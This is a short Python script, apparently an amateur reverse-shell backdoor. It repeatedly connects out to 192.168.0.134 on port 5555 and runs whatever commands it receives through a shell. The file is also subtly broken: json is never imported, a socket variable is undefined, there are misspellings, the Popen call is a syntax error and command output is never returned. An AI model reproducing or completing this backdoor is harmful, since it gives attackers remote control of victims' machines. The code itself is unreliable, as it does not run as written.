import socket
import time
import subprocess


def reliable_send(data):
        jsondata = json.dumps(data)
        s.send(jsondata.encode())

def reliable_recv():
        data = ''
        while True:
                try:
                        data = data + target.recv(1024).decode().rstip()
                        return json.loads(data)
                except ValueError:
                        continue


def connection():
	while True:
		time.sleep(20)
		try:
			s.connect(('192.168.0.134',5555))
			shell()
			s.close()
			break
		except:
			connection()


def shell():
	while True:
		command = reliable_recv()
		if comman == 'quit':
			break
		else:
			execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, subprocess.PIPE)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
